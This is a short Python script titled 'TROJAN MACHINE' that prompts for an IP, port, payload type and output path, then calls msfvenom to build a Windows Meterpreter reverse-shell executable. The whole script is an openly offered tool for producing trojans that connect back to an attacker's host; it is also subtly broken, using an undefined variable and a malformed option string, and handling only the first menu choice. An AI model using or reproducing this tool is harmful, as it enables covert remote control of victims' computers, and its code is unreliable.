#!/usr/bin/env python
import os
os.system("apt-get install figlet")
os.system("clear")
os.system("figlet TRO-MAC")
print("""
DENEME7 - TROJAN MACHINE
""")
tip = raw_input("IP: ")
port = raw_input("PORT: ")
print("""
1) windows/meterpreter/reverse_tcp
2) windows/meterpreter/reverse_http
3) windows/meterpreter/reverse_https
""")
payload = raw_input("Choose one: ")
path = raw_input("PATH: ")
if(payload == "1"):
	os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" +ip +"LPORT="+port +" -f exe -o " +path)